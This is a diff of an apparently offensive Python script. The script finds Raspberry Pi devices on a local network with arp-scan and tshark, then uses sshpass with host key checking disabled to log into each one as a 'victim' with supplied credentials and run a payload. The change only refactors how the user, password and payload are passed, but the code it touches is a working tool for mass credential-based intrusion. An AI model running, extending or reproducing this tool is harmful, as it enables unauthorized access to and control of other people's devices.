@@ -18,7 +18,7 @@ def list_payloads():
 	print('\n')
 
 
-def scan(args):
+def scan():
 	os.system('sudo arp-scan -g --localnet -W ./scan/scan.pcap')
 	os.system('tshark -r ./scan/scan.pcap > ./scan/pcap.txt 2>/dev/null')
 	os.system('cat ./scan/pcap.txt | grep -i "rasp" > ./scan/raspi_list')
@@ -28,15 +28,15 @@ def scan(args):
 		ip_list = [line.strip() for line in inf]
 	return ip_list
 
-def rpi(ip_list, args, payload):
+def rpi(ip_list, user, creds, payload):
 	cprint('\nLoaded '+ str(len(ip_list)) + ' IP(s)', 'yellow')
 
-	cprint("Loaded payload: " + args.payload, "green")
+	cprint("Loaded payload: " + payload, "green")
 	cprint("Beginning to send payload to Pi's...", "blue")
 
 	for ip in ip_list:
 		print(colored("Sending payload to victim", "yellow"), colored(ip, "red"))
-		os.system("sshpass -p \""+args.creds+"\" ssh -o stricthostkeychecking=no "+args.user+"@"+ip+" "+payload)
+		os.system("sshpass -p \""+creds+"\" ssh -o stricthostkeychecking=no "+user+"@"+ip+" "+payload)
 		print("\n")
 
 def intro():
@@ -53,10 +53,12 @@ def let_the_hunt_begin(args):
 		payload=payloads[args.payload]
 	else:
 		payload=args.payload
+  
+	[user, creds] = [args.user, args.creds]
     
 	intro()
 
 	if args.list:
 		list_payloads()
 	else:
-		rpi(scan(args), args, payload)
+		rpi(scan(), user, creds, payload)
